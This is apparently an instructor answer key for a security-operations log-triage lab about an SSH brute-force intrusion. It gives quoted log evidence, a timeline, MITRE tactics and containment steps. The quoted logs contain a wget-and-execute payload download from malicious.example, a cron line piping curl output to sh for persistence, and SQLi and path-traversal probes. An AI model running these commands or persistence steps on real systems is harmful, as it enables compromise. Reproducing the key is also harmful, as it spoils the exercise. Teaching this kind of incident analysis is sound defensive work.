# answers.md — Lab 1 

> **Purpose:** Instructor reference answers for Lab 1. These are the key findings, timeline, and suggested escalation steps students should identify after analyzing `auth.log`, `syslog`, and `apache_access.log`.

---

## 1) Short summary (1–2 lines)

Confirmed intrusion: attacker (198.51.100.23) performed a brute-force attack against SSH, succeeded logging in as `svc_backup`, then downloaded/attempted to execute a payload and created a cron job for persistence.

---

## 2) Key indicators & evidence (log excerpts)

(Representative lines students should find — include these exact lines in the instructor key)

```
# auth.log — successful login after brute-force spike
Oct 24 20:30:30 webserver-01 sshd[5999]: Accepted password for svc_backup from 198.51.100.23 port 42318 ssh2
Oct 24 20:30:30 webserver-01 sshd[5999]: pam_unix(sshd:session): session opened for user svc_backup by (uid=0)

# auth.log — brute-force spike (example)
Oct 24 20:00:10 webserver-01 sshd[5201]: Failed password for root from 198.51.100.23 port 40001 ssh2
Oct 24 20:00:20 webserver-01 sshd[5202]: Failed password for admin from 198.51.100.23 port 40002 ssh2
# (many similar Failed password lines from 198.51.100.23)

# syslog — payload download and cron creation
Oct 24 20:35:12 webserver-01 sh[5000]: wget http://malicious.example/payload.sh -O /tmp/payload.sh
Oct 24 20:35:18 webserver-01 sh[5001]: chmod +x /tmp/payload.sh && /tmp/payload.sh
Oct 24 20:35:30 webserver-01 CRON[5010]: (svc_backup) CMD (echo "*/5 * * * * svc_backup /usr/bin/curl -s http://malicious.example/payload.sh | sh" > /var/spool/cron/crontabs/svc_backup)
Oct 24 20:45:00 webserver-01 CRON[6000]: (svc_backup) CMD (/bin/sh /tmp/payload.sh)

# apache_access.log — attacker fetched payload via HTTP
198.51.100.23 - - [24/Oct/2025:20:00:40 +0000] "GET /payload.sh HTTP/1.1" 200 532 "-" "curl/7.68.0"

# apache_access.log — probing requests (examples)
198.51.100.23 - - [24/Oct/2025:20:00:10 +0000] "GET /?id=1%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1" 200 800 "-" "Mozilla/5.0"
198.51.100.23 - - [24/Oct/2025:20:00:15 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 512 "-" "Mozilla/5.0"
```

> These excerpts are the load-bearing evidence students should locate and copy into their `triage_report.txt`.

---

## 3) Timeline (recommended answers)

Students should produce a timeline similar to this (timestamps approximate, taken from logs):

1. **~Oct 24 20:00 — 20:30**: Repeated `Failed password` attempts from `198.51.100.23` (brute-force). Many usernames targeted (root, admin, test, etc.).
2. **Oct 24 20:30:30**: `Accepted password` for `svc_backup` from `198.51.100.23` → session opened.
3. **~Oct 24 20:35**: `svc_backup` (session) executes `wget http://malicious.example/payload.sh -O /tmp/payload.sh` and attempts to run it. Execution logs show errors and additional installer steps.
4. **~Oct 24 20:35 — 20:36**: A cron entry is created for `svc_backup` to run a curl-based payload fetch every 5 minutes: `*/5 * * * * svc_backup /usr/bin/curl -s http://malicious.example/payload.sh | sh`.
5. **Oct 24 20:45 and onward**: Cron runs `/tmp/payload.sh`, which produces logs indicating a background listener and network traffic (kernel/netfilter entries referencing SRC=198.51.100.23 DPT=4444).
6. **Concurrent web evidence**: Apache logs show the attacking IP probing for LFI/SQLi and successfully fetching `/payload.sh` via HTTP prior to or around the successful SSH login.

---

## 4) Classification

* **Type:** Confirmed intrusion (initial access by brute-force → credential compromise).
* **Tactics observed:** Initial access (T1110 Brute Force), Execution (T1059 via shell script), Persistence (T1053 cron), Command & Control indications (background listener entries in syslog/kernel).

---

## 5) Exact artifacts to include in `triage_report.txt` (suggested)

* The `Accepted password` line for `svc_backup`.
* A representative `Failed password` sample showing the brute-force from `198.51.100.23`.
* The `wget`/`chmod`/`/tmp/payload.sh` execution lines from `syslog`.
* The cron creation line for `svc_backup`.
* The `apache_access.log` line showing `GET /payload.sh` from `198.51.100.23`.

---

## 6) Recommended immediate actions (student should list these)

1. **Isolate the host** from the network (or block outbound connections) to prevent further C2 or lateral movement.
2. **Preserve evidence**: make copies of `/var/log/auth.log`, `/var/log/syslog`, `/var/log/apache2/*` and the `/tmp/payload.sh` file. Note exact file paths and timestamps.
3. **Disable the compromised account** `svc_backup` and any unauthorized keys, and rotate credentials for affected accounts.
4. **Remove the malicious cron entry** (document where it lived: `/var/spool/cron/crontabs/svc_backup`) and stop `/tmp/payload.sh` processes.
5. **Escalate to SOC Level 2 / Incident Response** with the `triage_report.txt`, included log excerpts, and recommended steps.
6. **Network containment**: block IP `198.51.100.23` at perimeter firewalls and IDS rules; check for further communication to malicious.example and other indicator domains/IPs.

---

## 7) Suggested follow-ups for L2/IR (not required for L1 but useful to note)

* Full forensic capture of the host (memory image, disk image).
* Identify persistence mechanisms beyond cron (startup scripts, systemd units, SSH keys).
* Search other hosts for the same suspicious cron entry or `svc_backup` logins.
* Reverse-engineer `payload.sh` if obtainable (determine capabilities: beaconing, data exfiltration, lateral movement).

---

> End of answers.md
